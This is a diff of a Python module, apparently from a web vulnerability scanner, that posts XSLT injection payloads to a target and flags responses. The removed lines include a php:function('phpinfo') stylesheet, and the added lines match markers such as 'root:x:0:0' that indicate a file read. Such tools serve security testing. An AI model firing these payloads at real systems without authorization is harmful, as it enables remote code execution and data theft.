@@ -1,21 +1,36 @@
-"""xslt_injection — XSLT processor injection probe"""
+"""xslt_injection — XSLT processor injection (RCE/data disclosure)"""
+from core.probe import Probe
 from core.http import HttpClient
+from core.payload_source import get_payloads
 
-PAYLOADS = [
-    '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="system-property(\'xsl:vendor\')"/></xsl:template></xsl:stylesheet>',
-    '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function(\'phpinfo\')"/></xsl:template></xsl:stylesheet>',
-]
+PAYLOADS = get_payloads("xslt")
+MARKERS = ["libxslt", "sablotron", "Xalan", "MSXML", "phpinfo", "root:x:0:0",
+           "XSLT", "vendor"]
+
 
 class XsltInjection:
     def run(self, session, logger):
         http = HttpClient(session, logger)
+        probe = Probe(session, logger)
+        probe.baseline_probe(session.target)
+        print(f"[xslt] target: {session.target}")
+        print(f"[xslt] {len(PAYLOADS)} payloads")
+
         findings = []
         for p in PAYLOADS:
-            r = http.post(session.target, data=p, headers={"Content-Type":"application/xml"})
-            if not r: continue
-            if "libxslt" in r.text.lower() or "xslt" in r.text.lower() or "phpinfo" in r.text.lower():
-                findings.append({"payload":p[:60],"code":r.status_code})
-                print(f"  [!] XSLT processor responds")
-                logger.finding("xslt","high","processor reflected")
-        print(f"[xslt_injection] {len(findings)}")
-        return {"findings": findings}
+            r = http.post(session.target, data=p,
+                          headers={"Content-Type": "application/xml"})
+            if not r:
+                continue
+            low = r.text.lower()
+            hit = next((m for m in MARKERS if m.lower() in low), None)
+            if not hit:
+                continue
+            sev = "critical" if hit in ("root:x:0:0", "phpinfo") else "high"
+            print(f"  ✓ [{sev}] {hit}")
+            findings.append({"payload": p[:60], "marker": hit,
+                             "severity": sev, "verified": True})
+            logger.finding("xslt_injection", sev, hit)
+
+        print(f"[xslt] total: {len(findings)}")
+        return {"findings": findings, "stats": probe.summary()}
